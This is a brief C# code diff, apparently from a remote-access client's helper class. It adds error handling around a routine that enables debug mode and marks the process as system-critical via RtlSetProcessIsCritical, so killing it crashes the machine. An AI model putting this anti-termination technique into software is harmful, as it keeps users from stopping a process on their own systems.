@@ -22,7 +22,11 @@ namespace Client.Helper
                 Process.EnterDebugMode();
                 Helper.NativeMethods.RtlSetProcessIsCritical(1, 0, 0);
             }
-            catch { }
+            catch (Exception ex)
+            {
+                // Critical: Process critical flag setting failed
+                ErrorHandler.HandleCritical(() => { }, ex, "ProcessCritical.Set failed");
+            }
         }
         public static void Exit()
         {
